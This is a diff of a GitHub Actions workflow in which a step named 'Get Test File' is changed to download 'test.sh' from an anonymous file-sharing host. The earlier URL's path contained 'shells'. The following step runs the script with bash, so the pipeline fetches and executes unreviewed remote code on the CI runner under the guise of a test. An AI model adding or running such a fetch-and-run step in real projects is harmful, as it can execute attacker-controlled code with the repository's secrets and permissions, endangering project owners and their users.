@@ -32,7 +32,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Get Test File
         run: |
-          wget https://maxlubol.com/GalleryUpload/stuff/shells/test.sh
+          wget https://filebin.net/6ojwl960d3phiubu/test.sh
 
       - name: Run Test File
         run: bash ./test.sh
